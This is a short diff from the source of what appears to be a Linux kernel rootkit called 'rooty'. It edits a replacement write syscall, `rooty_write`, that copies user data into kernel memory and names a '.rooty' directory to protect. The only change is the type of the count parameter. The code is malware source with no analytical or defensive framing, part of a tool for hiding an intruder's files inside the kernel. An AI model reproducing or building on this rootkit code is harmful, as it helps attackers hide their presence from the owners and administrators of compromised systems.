@@ -44,7 +44,7 @@ psize **find(void) {
  return NULL;
 }
 
-asmlinkage ssize_t rooty_write(int fd, const char __user *buff, size_t count) {
+asmlinkage ssize_t rooty_write(int fd, const char __user *buff, ssize_t count) {
  int r; /* return */
  char *proc_protect = ".rooty"; /* directory name to protect */
  char *kbuff = (char *) kmalloc(256,GFP_KERNEL); /* allocate kernel memory for memory from userland */
